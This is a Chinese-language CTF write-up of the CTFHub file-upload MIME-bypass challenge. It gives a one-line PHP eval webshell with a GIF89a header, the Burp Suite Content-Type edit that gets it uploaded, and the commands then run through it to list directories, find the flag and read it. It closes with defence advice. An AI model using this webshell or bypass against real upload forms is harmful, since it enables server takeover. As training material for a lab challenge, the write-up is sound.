【CTFHub】Web-MIME绕过 Writeup

操作者：何芊宏 | 操作日期：2026.9.18 | 分类：CTF | 标签：CTFHub, Web, 文件上传, MIME绕过, BurpSuite

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - 文件上传 / MIME绕过
  • 题目名称：MIME绕过
  • 提示：服务器只校验数据包中的 Content-Type 字段，而不校验文件内容

2. 解题思路

本题的核心是利用服务器对客户端请求头 Content-Type 的盲目信任。当浏览器上传文件时，会根据文件后缀自动生成对应的 MIME 类型（如 application/x-php）。我们只需使用 Burp Suite 拦截请求，将文件块中的 Content-Type 强行修改为图片类型（如 image/gif），服务器就会误认为我们上传的是合法的 GIF 图片，从而绕过校验。

3. 操作步骤

第一步：环境准备与木马制作（快节奏复盘）

有了上一关“文件头检查”的经验，环境配置和杀软白名单已就绪，不再受阻。

  • 在 muma 文件夹中创建 shell.php，内容为： 
    GIF89a
<?php @eval($_POST['cmd']); ?>
  • 开启 CTFHub 的“MIME绕过”环境，确保 Burp Suite 处于拦截开启（Intercept is on）状态。

第二步：抓包与 MIME 类型修改（核心操作）

  1. 在 BP 自带浏览器中选中 shell.php 并点击提交。
  2. BP 拦截请求后，错误地将第7行外层的 Content-Type: multipart/form-data 改为了 image/form-data（这是一个致命手误，会导致服务器无法解析表单），立刻还原。
  3. 往下滚动请求体，找到文件块的内容：
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: application/x-php
  4. 将文件块的 Content-Type: application/x-php 修改为 Content-Type: image/gif。
  5. 点击 Forward 放行，网页提示“上传成功”，路径为 upload/shell.php。

第三步：Repeater 连马与 400 报错规避（熟练操作）

将上传成功的请求发送至 Repeater，清理数据包，防止 Content-Length 算错：

  1. 第一行改为：POST /upload/shell.php HTTP/1.1
  2. 将 Content-Type: multipart/form-data;...</code> 改为 <code>Content-Type: application/x-www-form-urlencoded。
  3. 彻底删除下方所有残留的 ------WebKitFormBoundary... 及文件内容。
  4. 写入 cmd=system("ls /");，保留空行，将 Content-Length 改为 19，成功回显根目录文件夹列表。

第四步：全盘搜索 flag 文件（进阶操作）

  1. 将请求体替换为：cmd=system("find / -name flag* 2>/dev/null");
  2. 手动计算长度，该命令长度为 45，修改 Content-Length: 45，点击 Send。
  3. 右侧成功回显绝对路径：/var/www/html/flag_48018868.php。

第五步：尝试读取 Flag 与 PHP 原生函数破局（绝佳踩坑）

  • 试错一：使用命令 cmd=system("cat /var/www/html/flag_48018868.php");（长度50）。发送后，右侧仅回显 GIF89a。推断出此环境可能禁用了系统底层 cat 命令，或者存在权限限制。
  • 试错二（成功）：放弃系统命令，改用 PHP 原生文件读取函数。修改命令为：
    cmd=print_r(file_get_contents('/var/www/html/flag_48018868.php'));
    精确计算长度，该命令长度为 67，修改 Content-Length: 67。点击 Send。
  • 结果：右侧成功完整打印出 Flag：
    ctfhub{dad0ee38df0dbab6f677e5d9}

4. 踩坑记录与复盘

  • 搞错修改对象（外网 / 内网）：新手极其容易把外层的 Content-Type: multipart/form-data 和文件块的 Content-Type: application/octet-stream 混淆。外层是告诉服务器“这是表单数据”，千万不能乱改；内层才是我们用来伪装 MIME 类型的靶点。
  • 禁用函数带来的“虚假失败”：即使木马已经成功执行，也可能会遇到 system("cat ...") 无回显的情况。此时不要怀疑漏洞利用失败，而是要学会备用方案——使用 print_r()、file_get_contents() 等 PHP 原生函数来读取文件。
  • HTTP 协议规范的痛苦记忆（老坑新用）：改包后的 Content-Length 长度计算和保留空行，直接决定了请求会不会报 400 Bad Request。务必保持严谨的算长习惯，或者使用 BP 的 Pretty 视图来添加参数。

5. 知识总结

  • MIME 类型绕过原理：MIME 类型（MIME Type）是网络传输中标识文件类型的标签。后端若仅通过请求头中的 Content-Type 来判断文件类型，只需在 Burp 中修改该字段（如改为 image/gif）即可绕过后端验证。
  • 双保险绕过技巧：在实战中，最佳策略是同时使用“文件头伪装（GIF89a）”和“MIME 伪装（image/gif）”，这样可以同时绕过服务器的文件内容检查和请求头检查。
  • 安全防御建议：服务端绝对不能信任客户端发送的 MIME 类型。必须使用服务端代码（如 PHP 的 finfo 扩展）真实地检测文件 MIME；同时严格限制后缀名，并将上传目录设置为不可执行脚本，彻底防御文件上传漏洞。
